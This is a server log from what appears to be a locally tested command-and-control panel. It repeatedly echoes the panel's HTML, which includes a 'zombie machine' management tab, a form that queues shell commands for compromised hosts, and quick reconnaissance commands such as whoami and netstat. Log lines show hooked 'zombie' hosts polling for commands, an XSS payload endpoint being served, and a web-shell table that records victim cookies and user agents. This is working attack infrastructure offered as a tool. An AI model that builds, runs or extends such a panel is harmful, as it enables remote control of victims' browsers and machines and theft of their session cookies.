onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:27:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:21] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:22 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 11:27:22 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 11:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 11:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:22] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 11:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 11:27:22 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 11:27:22 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T03:27:22.937Z"}', None, '2025-06-25 11:27:22.940708', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 11:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:22] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 11:27:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:27:22 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:27:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0014s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-25 11:27:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:22] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-25 11:27:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:23 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:24 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:26 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 11:27:28 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-25 11:27:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 31 bytes [200 OK]>
2025-06-25 11:27:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 11:27:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 11:27:30 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 11:27:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0001s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 11:27:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:30] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 11:27:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 11:27:30 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 11:27:30 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-25T03:27:30.223Z"}', None, '2025-06-25 11:27:30.225990', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 11:27:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 11:27:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 11:27:30] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 11:27:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 11:27:30 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-25 11:27:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0011s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-25T03:25:06.035Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 11:25:06.039456</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                   